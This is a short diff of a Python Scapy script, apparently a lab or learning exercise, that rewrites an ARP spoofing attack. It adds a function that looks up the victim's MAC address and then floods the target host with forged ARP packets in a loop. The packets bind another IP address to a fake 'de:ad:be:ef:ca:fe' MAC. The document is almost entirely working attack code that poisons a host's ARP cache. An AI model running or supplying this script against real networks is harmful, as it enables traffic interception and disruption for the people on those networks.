@@ -1,10 +1,16 @@
 from scapy.all import *
 
-trame = Ether(type=0x0806)
+def get_mac(ip): 
+    arp_request = ARP(pdst = ip) 
+    broadcast = Ether(dst ="ff:ff:ff:ff:ff:ff") 
+    arp_request_broadcast = broadcast / arp_request 
+    answered_list = srp(arp_request_broadcast, timeout = 5, verbose = False)[0] 
+    return answered_list[0][1].hwsrc 
 
-packet = ARP(op=2, hwsrc="de:ad:be:ef:ca:fe", psrc="10.13.33.37", hwdst="74:56:3c:38:c2:df", pdst="192.168.1.42")
+def spoof(target_ip, spoof_ip, mac_change): 
+    arp = ARP(op="who-has", hwdst = get_mac(target_ip), hwsrc = mac_change , psrc = spoof_ip, pdst=target_ip)
 
-trame = trame / packet
+    send(arp, inter=1, verbose = False, loop=1 )
 
-while True:
-    sendp(trame)
+
+spoof("10.33.76.184", "10.13.33.37", "de:ad:be:ef:ca:fe")
